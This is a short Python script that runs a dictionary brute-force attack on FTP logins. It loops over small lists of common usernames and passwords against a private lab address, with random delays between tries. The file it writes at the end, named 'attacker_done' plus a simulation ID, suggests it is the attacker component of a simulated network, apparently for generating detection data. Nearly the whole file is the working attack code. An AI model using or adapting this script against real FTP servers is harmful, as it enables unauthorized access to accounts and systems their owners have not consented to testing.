import ftplib
import random
import time
import os

def ftp_bruteforce(host, userlist, passlist):
    for user in userlist:
        for password in passlist:
            try:
                ftp = ftplib.FTP(host)
                ftp.login(user, password)
                print(f"Success: {user}:{password}")
                ftp.quit()
                return
            except:
                print(f"Failed: {user}:{password}")
            time.sleep(random.uniform(0.1, 0.5))


if __name__ == "__main__":
    host = "172.16.238.12"
    userlist = ["admin", "user", "root","ftpuser"]
    passlist = ["password", "123456", "admin","ftppassword"]
    ftp_bruteforce(host, userlist, passlist)
    
    simulation_id = os.environ.get('SIMULATION_ID', 'unknown')
    with open(f'/signals/attacker_done_{simulation_id}', 'w') as f:
        f.write('done')

